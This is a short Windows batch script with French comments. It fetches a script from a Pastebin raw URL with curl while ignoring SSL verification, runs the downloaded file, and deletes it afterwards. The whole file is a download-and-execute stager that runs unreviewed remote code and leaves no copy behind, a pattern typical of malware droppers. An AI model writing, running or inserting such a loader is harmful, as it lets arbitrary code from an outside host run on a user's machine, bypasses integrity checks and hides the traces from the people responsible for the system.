@echo off
REM URL du pastebin (RAW)
set "PASTEBIN_URL=https://pastebin.com/raw/CaDVNikH"

REM Chemin temporaire pour le fichier
set "TMPFILE=%TEMP%\paste_script.bat"

REM Télécharger le script depuis Pastebin en ignorant les vérifications SSL
C:\Windows\System32\curl.exe -k -L "%PASTEBIN_URL%" -o "%TMPFILE%"

REM Vérifier si le fichier a été créé
if exist "%TMPFILE%" (
    echo Fichier téléchargé : %TMPFILE%
    REM Exécuter le script
    call "%TMPFILE%"
    REM Supprimer le fichier après exécution
    del "%TMPFILE%"
) else (
    echo Erreur : le fichier n'a pas été créé.
)